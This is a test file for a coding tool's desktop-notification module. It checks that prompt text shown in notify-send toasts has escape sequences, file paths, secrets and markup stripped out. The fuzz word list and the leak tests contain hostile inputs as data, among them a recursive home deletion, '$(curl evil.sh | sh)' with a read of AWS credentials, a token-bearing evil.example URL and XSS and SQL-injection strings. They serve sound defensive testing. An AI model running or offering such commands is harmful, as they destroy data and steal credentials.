import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { spawn } from 'node:child_process';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { pathToFileURL } from 'node:url';
import {
  DESKTOP_NOTIFY_AFTER_MS,
  DESKTOP_WAIT_AFTER_MS,
  approvalNotice,
  commandOnPath,
  createDesktopNotifier,
  execFileText,
  noticeLabel,
  noticeToolName,
  notifySendArgs,
  plainText,
  processAncestry,
  questionNotice,
  runEndNotice,
  type ExecFn,
} from './desktopNotify';
import { shortLabel } from './telegramNotify';

const INVISIBLE = /[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\p{Cs}\p{Co}]/u;

describe('what a toast says', () => {
  it('is a fixed phrase, the task, and how long it took', () => {
    expect(runEndNotice('fix the login bug', true, 45_000)).toEqual({ summary: 'Codeep finished — fix the login bug', body: 'took 45s' });
    expect(runEndNotice('fix the login bug', false, 252_000)).toEqual({ summary: 'Codeep stopped — fix the login bug', body: 'took 4m 12s' });
    expect(approvalNotice('execute_command')).toEqual({ summary: 'Codeep is waiting for your approval', body: 'execute_command' });
    expect(questionNotice('fix the login bug')).toEqual({ summary: 'Codeep has a question', body: 'fix the login bug' });
  });

  it('leaves the label out when nothing of the task may be said', () => {
    expect(runEndNotice('', true, 40_000)).toEqual({ summary: 'Codeep finished', body: 'took 40s' });
    expect(runEndNotice('src/app/main.ts', false, 40_000)).toEqual({ summary: 'Codeep stopped', body: 'took 40s' });
    expect(questionNotice('~/secrets.txt')).toEqual({ summary: 'Codeep has a question' });
    expect(notifySendArgs(questionNotice('~/secrets.txt'))).toEqual(['--app-name=Codeep', '--urgency=normal', '--', 'Codeep has a question']);
  });

  it('is passed to notify-send after `--`, so no word of it can be an option', () => {
    const args = notifySendArgs({ summary: '--urgency=critical', body: '--expire-time=0' });
    expect(args).toEqual(['--app-name=Codeep', '--urgency=normal', '--', '--urgency=critical', '--expire-time=0']);
    expect(args.indexOf('--')).toBe(2);
    // Everything that comes from outside is after it.
    expect(args.slice(0, 3).every(arg => arg === '--' || /^--(app-name=Codeep|urgency=normal)$/.test(arg))).toBe(true);
  });
});

describe('plain text', () => {
  it.each([
    ['an ANSI colour sequence, whole', 'a \x1b[31mred\x1b[0m word', 'a red word'],
    ['a cursor movement', 'x\x1b[2J\x1b[Hy', 'xy'],
    ['an OSC title, to its terminator', 'a\x1b]0;hostile title\x07b', 'ab'],
    ['an OSC with no terminator', 'a\x1b]8;;http://x', 'a'],
    ['8-bit CSI', 'a\u009b31mb', 'ab'],
    ['newlines and tabs', 'one\ntwo\r\nthree\tfour', 'one two three four'],
    ['NUL and DEL', 'a\x00b\x7fc', 'a b c'],
    ['bidi overrides', 'abc\u202Edef\u2066ghi\u2069', 'abcdefghi'],
    ['zero-width characters and a byte-order mark', 'a\u200Bb\u200Dc\uFEFFd', 'abcd'],
    ['line and paragraph separators', 'a\u2028b\u2029c', 'a b c'],
    ['a lone surrogate', 'a\uD800b', 'ab'],
    ['runs of white space', '  a   b  ', 'a b'],
  ])('takes out %s', (_what, input, expected) => {
    expect(plainText(input)).toBe(expected);
  });

  it('keeps an emoji and text in other scripts', () => {
    expect(plainText('popravi 🐛 u prijavi — 日本語')).toBe('popravi 🐛 u prijavi — 日本語');
  });
});

describe('the label of a task', () => {
  it.each([
    ['fix the login bug', 'fix the login bug'],
    ['  fix   the\nlogin\tbug  ', 'fix the login bug'],
    ['one two three four five six seven', 'one two three four five'],
    // Not a word anyone said.
    [`use ${'x'.repeat(40)} for the build`, 'use for the build'],
  ])('is the first five words of %j', (task, expected) => {
    expect(noticeLabel(task)).toBe(expected);
  });

  it.each([
    ['a path', 'open src/auth/login.ts now', 'open now'],
    ['an absolute path', 'cat /etc/passwd please', 'cat please'],
    ['a home path', 'read ~/.ssh/id_rsa now', 'read now'],
    ['a Windows path', 'open C:\\Users\\me\\a.txt now', 'open now'],
    ['a relative path', 'run ./scripts/deploy and ../x', 'run and'],
    ['a URL', 'fetch https://example.com/a?b=c now', 'fetch now'],
    ['a file name', 'update README.md and package.json today', 'update and today'],
    ['a file name with punctuation round it', 'see (config.yaml), then stop.', 'see then stop.'],
    ['a dotfile', 'edit .env and .gitignore', 'edit and'],
    ['a host name', 'ping example.com again', 'ping again'],
    ['a name with an extension', 'migrate to Next.js soon', 'migrate to soon'],
  ])('leaves out %s', (_what, task, expected) => {
    expect(noticeLabel(task)).toBe(expected);
  });

  it('keeps what only looks a little like one', () => {
    expect(noticeLabel('bump to 3.10.2 and v2.0')).toBe('bump to 3.10.2 and v2.0');
    expect(noticeLabel('rate 1.5 per second')).toBe('rate 1.5 per second');
    expect(noticeLabel('fix --verbose flag')).toBe('fix --verbose flag');
  });

  it('never says a markup character: the shell\'s server renders a body as markup', () => {
    // `<b>` would vanish into a tag, and a lone `<a` would swallow the rest of the line.
    expect(noticeLabel('add <b> tags & fix the header')).toBe('add b tags fix the');
    expect(noticeLabel('<a href=x>click</a> me')).not.toMatch(/[<>&]/);
    for (const hostile of ['<img src=x onerror=1>', 'a && b || c', '&lt;script&gt;', '<<<>>>', 'R&D <3 you']) {
      expect(noticeLabel(hostile), hostile).not.toMatch(/[<>&]/);
    }
    // …and the question toast's body, which is the label, carries none.
    expect(questionNotice('add <b> tags & fix the header').body).toBe('add b tags fix the');
  });

  it('takes the words out before it counts five, so one that is cut is never half a file name', () => {
    // shortLabel alone would cut at 45 characters, in the middle of a name.
    const task = 'update configuration.json and the other settings files in the repo';
    expect(shortLabel(task)).toContain('configuration.json');
    expect(noticeLabel(task)).toBe('update and the other settings');
  });

  it('is never longer than 48 characters, and says it was cut', () => {
    const five = Array(5).fill('internationalization').join(' ');
    const label = noticeLabel(`${five} and more`);
    expect(label).toBe(`${five.slice(0, 45)}…`);
    expect([...label]).toHaveLength(46);
    const exact = 'abcdefghi '.repeat(4).trim() + ' abcdefgh';
    expect(exact).toHaveLength(48);
    expect(noticeLabel(exact)).toBe(exact);
  });

  it('never leaves half of an emoji where it cut', () => {
    // The cut counts UTF-16 units and falls between the two halves of the
    // first bug: what is left of it is taken out.
    const label = noticeLabel(`${'a'.repeat(30)} ${'b'.repeat(13)}🐛🐛 and more words`);
    expect(label).toBe(`${'a'.repeat(30)} ${'b'.repeat(13)}…`);
    expect(INVISIBLE.test(label)).toBe(false);
  });

  it('says the same words as the phone\'s head, when there is nothing to leave out', () => {
    for (const task of ['fix the login bug', 'analyse the project', 'refactor the payment module to use the new client']) {
      expect(noticeLabel(task)).toBe(shortLabel(task));
    }
  });

  describe('for whatever a prompt can be', () => {
    // A small, seeded generator: the same inputs on every run, so a failure is
    // a case that can be looked at.
    function random(seed: number): () => number {
      let state = seed >>> 0;
      return () => {
        state = (state + 0x6d2b79f5) >>> 0;
        let t = state;
        t = Math.imul(t ^ (t >>> 15), t | 1);
        t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
        return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
      };
    }

    // Words a hostile prompt is made of. `secret` is what must never come out.
    const hostile: Array<{ text: string; secret?: string }> = [
      { text: 'fix' }, { text: 'the' }, { text: 'bug' }, { text: 'please' }, { text: '🐛' }, { text: 'popravi' },
      { text: '"quoted"' }, { text: "it's" }, { text: '`backticks`' }, { text: '$(whoami)' }, { text: '$HOME' },
      { text: '; rm -rf ~;' }, { text: '&&' }, { text: '|' }, { text: '>' },
      { text: '--flag' }, { text: '--urgency=critical' }, { text: '-h' }, { text: '--' },
      { text: '\x1b[31mred\x1b[0m' }, { text: '\x1b]0;title\x07' }, { text: '\u202Ereversed' }, { text: 'zero\u200Bwidth' },
      { text: 'line\nbreak' }, { text: 'tab\there' }, { text: 'nul\x00byte' },
      { text: '/etc/passwd', secret: 'passwd' }, { text: '~/.ssh/id_rsa', secret: 'id_rsa' },
      { text: 'C:\\Users\\vlado\\secret.txt', secret: 'secret.txt' }, { text: './deploy.sh', secret: 'deploy' },
      { text: 'src/utils/telegramNotify.ts', secret: 'telegramNotify' }, { text: 'credentials.json', secret: 'credentials' },
      { text: '.env', secret: '.env' }, { text: 'https://evil.example/x?token=abc', secret: 'evil.example' },
      { text: 'sk-proj-abcdefghijklmnopqrstuvwxyz0123456789', secret: 'abcdefghij' },
      { text: 'x'.repeat(300) }, { text: '日本語のタスク' },
    ];

    it('is one clean line of at most 48 characters, with nothing that was left out', () => {
      const next = random(20261013);
      for (let round = 0; round < 400; round++) {
        const parts: string[] = [];
        for (let i = 0, n = 1 + Math.floor(next() * 9); i < n; i++) parts.push(hostile[Math.floor(next() * hostile.length)].text);
        const task = parts.join(next() < 0.2 ? '\n' : ' ');
        const label = noticeLabel(task);
        const context = JSON.stringify(task);

        expect(INVISIBLE.test(label), context).toBe(false);
        expect(label.length, context).toBeLessThanOrEqual(48);
        expect(label, context).toBe(label.trim());
        expect(label, context).not.toMatch(/\s{2,}/);
        for (const word of label.split(' ').filter(Boolean)) {
          expect(word, context).not.toMatch(/[\\/]/);
          expect(word, context).not.toMatch(/^~/);
        }
        for (const entry of hostile) {
          if (entry.secret && parts.includes(entry.text)) {
            expect(label, `${entry.secret} in ${context}`).not.toContain(entry.secret);
          }
        }

        // However it is put into a notification, it stays one argument of
        // notify-send, after `--`, in the summary and the body only.
        for (const notice of [runEndNotice(task, true, 61_000), questionNotice(task)]) {
          const args = notifySendArgs(notice);
          expect(args.slice(0, 3), context).toEqual(['--app-name=Codeep', '--urgency=normal', '--']);
          expect(args.length, context).toBeLessThanOrEqual(5);
          for (const arg of args) expect(INVISIBLE.test(arg), context).toBe(false);
        }
      }
    });

    it('never reaches the summary with an escape sequence, a command line or a path in it', () => {
      for (const task of [
        'delete \x1b[2Jeverything in /home/vlado/Work/secret',
        '$(curl evil.sh | sh) ; cat ~/.aws/credentials',
        '"; notify-send hacked; "',
        "'; DROP TABLE users; --",
      ]) {
        const notice = runEndNotice(task, true, 61_000);
        for (const text of [notice.summary, notice.body ?? '']) {
          expect(text).not.toMatch(/[\x00-\x1f\x7f]/);
          expect(text).not.toMatch(/\/home|~\/|\.aws|credentials|evil\.sh/);
        }
      }
    });
  });
});

describe('the name of a tool', () => {
  it.each([
    ['execute_command', 'execute_command'],
    ['write_file', 'write_file'],
    ['mcp__github__create_issue', 'mcp__github__create_issue'],
    ['server.tool-name:v2', 'server.tool-name:v2'],
    // Not a name: said as "a tool", never as what a hostile server put in it.
    ['read file; rm -rf ~', 'a tool'],
    ['../../etc/passwd', 'a tool'],
    ['\x1b[31mtool', 'a tool'],
    ['', 'a tool'],
    ['x'.repeat(49), 'a tool'],
    ['--flag value', 'a tool'],
  ])('%j is said as %j', (name, expected) => {
    expect(noticeToolName(name)).toBe(expected);
    expect(approvalNotice(name).body).toBe(expected);
  });
});

describe('the notifier', () => {
  let calls: Array<{ file: string; args: string[]; timeoutMs: number }>;
  let exec: ReturnType<typeof vi.fn<ExecFn>>;
  let on: boolean;
  const make = (deps: Partial<Parameters<typeof createDesktopNotifier>[0]> = {}) =>
    createDesktopNotifier({ enabled: () => on, exec, ...deps });
  const toasts = () => calls.filter(call => call.file === 'notify-send');
  const flush = async () => { await vi.advanceTimersByTimeAsync(0); };

  beforeEach(() => {
    vi.useFakeTimers();
    calls = [];
    on = true;
    // hyprctl is not there, as on any desktop but Hyprland: a toast is shown.
    exec = vi.fn<ExecFn>(async (file, args, options) => {
      calls.push({ file, args, timeoutMs: options.timeoutMs });
      if (file === 'hyprctl') throw Object.assign(new Error('spawn hyprctl ENOENT'), { code: 'ENOENT' });
      return '';
    });
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  describe('when a run ends', () => {
    it('is silent for a run that took less than 30 seconds, and tells of one that took exactly 30', async () => {
      const notifier = make();
      notifier.runEnded({ task: 'fix bug', finished: true, elapsedMs: 29_999 });
      await flush();
      expect(toasts()).toEqual([]);

      notifier.runEnded({ task: 'fix bug', finished: true, elapsedMs: 30_000 });
      await flush();
      expect(DESKTOP_NOTIFY_AFTER_MS).toBe(30_000);
      expect(toasts()).toEqual([{
        file: 'notify-send',
        args: ['--app-name=Codeep', '--urgency=normal', '--', 'Codeep finished — fix bug', 'took 30s'],
        timeoutMs: expect.any(Number),
      }]);
    });

    it('says stopped for a run that was not finished', async () => {
      make().runEnded({ task: 'fix bug', finished: false, elapsedMs: 95_000 });
      await flush();
      expect(toasts()[0].args.slice(3)).toEqual(['Codeep stopped — fix bug', 'took 1m 35s']);
    });

    it('is silent with the setting off, and does not even look at the desktop', async () => {
      on = false;
      make().runEnded({ task: 'fix bug', finished: true, elapsedMs: 600_000 });
      await flush();
      expect(calls).toEqual([]);
    });

    it('asks the setting again at every run', async () => {
      const notifier = make();
      on = false;
      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
      on = true;
      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
      await flush();
      expect(toasts().map(call => call.args[3])).toEqual(['Codeep finished — b']);
    });

    it('bounds the child it starts', async () => {
      make().runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
      await flush();
      expect(toasts()[0].timeoutMs).toBeGreaterThan(0);
      expect(toasts()[0].timeoutMs).toBeLessThanOrEqual(10_000);
    });
  });

  describe('while an approval or a question waits', () => {
    it('says so once it has waited 10 seconds, and not a moment sooner', async () => {
      const notifier = make();
      notifier.waiting('approval', { task: 'fix bug', tool: 'execute_command' });
      await vi.advanceTimersByTimeAsync(9_999);
      expect(toasts()).toEqual([]);
      await vi.advanceTimersByTimeAsync(1);
      expect(DESKTOP_WAIT_AFTER_MS).toBe(10_000);
      expect(toasts().map(call => call.args.slice(3))).toEqual([['Codeep is waiting for your approval', 'execute_command']]);
    });

    it('names the task for a question', async () => {
      make().waiting('question', { task: 'fix the login bug' });
      await vi.advanceTimersByTimeAsync(10_000);
      expect(toasts().map(call => call.args.slice(3))).toEqual([['Codeep has a question', 'fix the login bug']]);
    });

    it('says nothing when it is answered in time', async () => {
      const end = make().waiting('approval', { task: 'a', tool: 'write_file' });
      await vi.advanceTimersByTimeAsync(9_000);
      end();
      await vi.advanceTimersByTimeAsync(60_000);
      expect(calls).toEqual([]);
      // And ending it again, or late, is nothing.
      expect(() => end()).not.toThrow();
    });

    it('says nothing when the run ends first', async () => {
      const notifier = make();
      notifier.waiting('approval', { task: 'a', tool: 'write_file' });
      notifier.waiting('question', { task: 'a' });
      await vi.advanceTimersByTimeAsync(5_000);
      notifier.runEnded({ task: 'a', finished: false, elapsedMs: 5_000 });
      await vi.advanceTimersByTimeAsync(60_000);
      expect(calls).toEqual([]);
    });

    it('keeps one wait from ending another', async () => {
      const notifier = make();
      const first = notifier.waiting('approval', { task: 'a', tool: 'write_file' });
      notifier.waiting('approval', { task: 'a', tool: 'execute_command' });
      first();
      await vi.advanceTimersByTimeAsync(10_000);
      expect(toasts().map(call => call.args[4])).toEqual(['execute_command']);
    });

    it('is silent with the setting off at the time it would have spoken', async () => {
      make().waiting('approval', { task: 'a', tool: 'write_file' });
      on = false;
      await vi.advanceTimersByTimeAsync(10_000);
      expect(calls).toEqual([]);
    });

    it('does not keep the process alive', () => {
      vi.useRealTimers();
      const spy = vi.spyOn(globalThis, 'setTimeout');
      try {
        const end = make().waiting('approval', { task: 'a', tool: 'write_file' });
        const timer = spy.mock.results[0].value as NodeJS.Timeout;
        expect(timer.hasRef()).toBe(false);
        end();
      } finally {
        spy.mockRestore();
      }
    });
  });

  describe('when the user is looking at it', () => {
    // Process 500 (Codeep) → 400 (the shell) → 300 (the terminal) → 1.
    const stat = (pid: number, parent: number) => `${pid} (node) S ${parent} ${pid} ${pid} 0 -1 4194304 0 0 0 0`;
    const proc: Record<string, string> = {
      '/proc/500/stat': stat(500, 400),
      '/proc/400/stat': stat(400, 300),
      '/proc/300/stat': stat(300, 1),
    };
    const readProc = (path: string) => proc[path] ?? null;
    const focus = (reply: string | Error) => {
      exec.mockImplementation(async (file, args, options) => {
        calls.push({ file, args, timeoutMs: options.timeoutMs });
        if (file === 'hyprctl') {
          if (reply instanceof Error) throw reply;
          return reply;
        }
        return '';
      });
    };
    const run = async () => {
      make({ pid: 500, readProc }).runEnded({ task: 'fix bug', finished: true, elapsedMs: 60_000 });
      await flush();
    };

    it('skips the toast when the focused window is a process above Codeep', async () => {
      focus('{"address":"0xabc","pid":300,"class":"Alacritty"}');
      await run();
      expect(calls.map(call => call.file)).toEqual(['hyprctl']);
      expect(calls[0].args).toEqual(['-j', 'activewindow']);
      expect(toasts()).toEqual([]);
    });

    it('also skips it when the focused window is the immediate parent, or Codeep itself', async () => {
      focus('{"pid":400}');
      await run();
      expect(toasts()).toEqual([]);
      focus('{"pid":500}');
      await run();
      expect(toasts()).toEqual([]);
    });

    it('shows it when the focused window is somebody else\'s', async () => {
      focus('{"pid":9999}');
      await run();
      expect(toasts()).toHaveLength(1);
    });

    it.each([
      ['hyprctl is not there', Object.assign(new Error('ENOENT'), { code: 'ENOENT' })],
      ['hyprctl fails', new Error('Command failed')],
      ['no window has focus', '{}'],
      ['it answers something that is not JSON', 'Invalid'],
      ['the pid is not a pid', '{"pid":"abc"}'],
      ['the pid is zero', '{"pid":0}'],
      ['the answer is null', 'null'],
    ])('shows it when %s', async (_what, reply) => {
      focus(reply);
      await run();
      expect(toasts()).toHaveLength(1);
    });

    it('shows it when /proc cannot say who Codeep\'s parents are', async () => {
      focus('{"pid":300}');
      make({ pid: 500, readProc: () => null }).runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
      await flush();
      expect(toasts()).toHaveLength(1);
    });

    it('asks hyprctl for a waiting approval too', async () => {
      focus('{"pid":300}');
      make({ pid: 500, readProc }).waiting('approval', { task: 'a', tool: 'write_file' });
      await vi.advanceTimersByTimeAsync(10_000);
      expect(toasts()).toEqual([]);
      expect(calls.map(call => call.file)).toEqual(['hyprctl']);
    });

    it('stops asking for a hyprctl that is not there', async () => {
      focus(Object.assign(new Error('ENOENT'), { code: 'ENOENT' }));
      const notifier = make({ pid: 500, readProc });
      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
      await flush();
      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
      await flush();
      expect(calls.filter(call => call.file === 'hyprctl')).toHaveLength(1);
      expect(toasts()).toHaveLength(2);
    });
  });

  describe('when something goes wrong', () => {
    it('never throws into the run, whatever fails', async () => {
      const unhandled = vi.fn();
      process.on('unhandledRejection', unhandled);
      try {
        for (const failing of [
          () => { throw new Error('exec threw'); },
          async () => { throw new Error('exec rejected'); },
        ]) {
          exec.mockImplementation(failing as ExecFn);
          const notifier = make();
          expect(() => notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 })).not.toThrow();
          expect(() => notifier.waiting('approval', { task: 'a', tool: 'x' })()).not.toThrow();
          notifier.waiting('question', { task: 'a' });
          await vi.advanceTimersByTimeAsync(10_000);
        }
        const broken = createDesktopNotifier({ enabled: () => { throw new Error('config unreadable'); }, exec });
        expect(() => broken.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 })).not.toThrow();
        expect(() => broken.waiting('question', { task: 'a' })()).not.toThrow();
        await flush();
        expect(unhandled).not.toHaveBeenCalled();
      } finally {
        process.removeListener('unhandledRejection', unhandled);
      }
    });

    it('stops trying for a notify-send that is not there', async () => {
      exec.mockImplementation(async (file, args, options) => {
        calls.push({ file, args, timeoutMs: options.timeoutMs });
        throw Object.assign(new Error('spawn notify-send ENOENT'), { code: 'ENOENT' });
      });
      const notifier = make();
      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
      await flush();
      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
      await flush();
      expect(toasts()).toHaveLength(1);
    });

    it('keeps trying after a notify-send that failed some other way', async () => {
      exec.mockImplementation(async (file, args, options) => {
        calls.push({ file, args, timeoutMs: options.timeoutMs });
        if (file === 'notify-send') throw new Error('Cannot autolaunch D-Bus without X11 $DISPLAY');
        throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
      });
      const notifier = make();
      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
      await flush();
      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
      await flush();
      expect(toasts()).toHaveLength(2);
    });
  });
});

describe('who Codeep\'s parents are', () => {
  const stat = (pid: number, name: string, parent: number) => `${pid} (${name}) S ${parent} ${pid} ${pid} 0 -1 4194304`;

  it('walks /proc/<pid>/stat upwards, nearest first', () => {
    const files: Record<string, string> = {
      '/proc/30/stat': stat(30, 'node', 20),
      '/proc/20/stat': stat(20, 'zsh', 10),
      '/proc/10/stat': stat(10, 'kitty', 1),
    };
    expect(processAncestry(30, path => files[path] ?? null)).toEqual([30, 20, 10, 1]);
  });

  it('reads the parent after the name, which may hold spaces and parentheses', () => {
    const files: Record<string, string> = {
      '/proc/30/stat': stat(30, 'my (odd) proc ) 99', 20),
      '/proc/20/stat': stat(20, 'a b', 1),
    };
    expect(processAncestry(30, path => files[path] ?? null)).toEqual([30, 20, 1]);
  });

  it('stops at a loop, at a process it cannot read, and at a very long chain', () => {
    const loop: Record<string, string> = { '/proc/2/stat': stat(2, 'a', 3), '/proc/3/stat': stat(3, 'b', 2) };
    expect(processAncestry(2, path => loop[path] ?? null)).toEqual([2, 3]);
    expect(processAncestry(7, () => null)).toEqual([7]);
    const chain = (path: string) => {
      const pid = Number(/\/proc\/(\d+)\/stat/.exec(path)![1]);
      return stat(pid, 'p', pid + 1);
    };
    expect(processAncestry(1000, chain).length).toBeLessThanOrEqual(64);
  });
});

describe('running a program', () => {
  it('hands the arguments over as they are, with no shell to read them', async () => {
    const hostile = ['--', '$(echo pwned)', '; echo pwned', "it's", '"quoted"', '`id`', '--urgency=critical', 'a\nb', '*', '~'];
    const out = await execFileText(process.execPath, ['-e', 'process.stdout.write(JSON.stringify(process.argv.slice(1)))', '--', ...hostile], { timeoutMs: 5000 });
    expect(JSON.parse(out)).toEqual(hostile);
  });

  it('rejects with ENOENT for a program that is not there', async () => {
    await expect(execFileText('codeep-no-such-program', [], { timeoutMs: 1000 })).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('does not keep the caller alive for a program that never answers', async () => {
    // A process of its own, since this one is held by the test runner. It
    // starts a program that runs for 10 seconds and has nothing left to do.
    const script = join(mkdtempSync(join(tmpdir(), 'codeep-exec-probe-')), 'probe.mjs');
    writeFileSync(script, [
      `const { execFileText } = await import(${JSON.stringify(pathToFileURL(join(process.cwd(), 'src', 'utils', 'desktopNotify.ts')).href)});`,
      "execFileText(process.execPath, ['-e', 'setTimeout(() => {}, 10000)'], { timeoutMs: 60000 }).catch(() => {});",
    ].join('\n'));
    const started = Date.now();
    const code = await new Promise<number | null>((resolve, reject) => {
      const child = spawn(process.execPath, ['--import', 'tsx', script], { cwd: process.cwd(), stdio: 'ignore' });
      child.on('error', reject);
      child.on('exit', resolve);
      setTimeout(() => child.kill(), 12_000).unref();
    });
    rmSync(join(script, '..'), { recursive: true, force: true });
    expect(code).toBe(0);
    expect(Date.now() - started).toBeLessThan(8_000);
  }, 30_000);

  it('rejects when the program fails, and when it takes longer than allowed', async () => {
    await expect(execFileText(process.execPath, ['-e', 'process.exit(3)'], { timeoutMs: 5000 })).rejects.toBeTruthy();
    const started = Date.now();
    await expect(execFileText(process.execPath, ['-e', 'setTimeout(() => {}, 20000)'], { timeoutMs: 150 })).rejects.toBeTruthy();
    expect(Date.now() - started).toBeLessThan(5000);
  });
});

describe('commandOnPath', () => {
  let dir: string;
  beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'codeep-on-path-')); });
  afterEach(() => { rmSync(dir, { recursive: true, force: true }); });

  it.skipIf(process.platform === 'win32')('finds an executable file in a directory of PATH, and only that', () => {
    writeFileSync(join(dir, 'notify-send'), '#!/bin/sh\n');
    chmodSync(join(dir, 'notify-send'), 0o755);
    writeFileSync(join(dir, 'not-executable'), '');
    chmodSync(join(dir, 'not-executable'), 0o644);
    const env = { PATH: `/no/such/dir::${dir}` };
    expect(commandOnPath('notify-send', env)).toBe(true);
    expect(commandOnPath('not-executable', env)).toBe(false);
    expect(commandOnPath('missing', env)).toBe(false);
    expect(commandOnPath('notify-send', { PATH: '' })).toBe(false);
    expect(commandOnPath('notify-send', {})).toBe(false);
  });
});
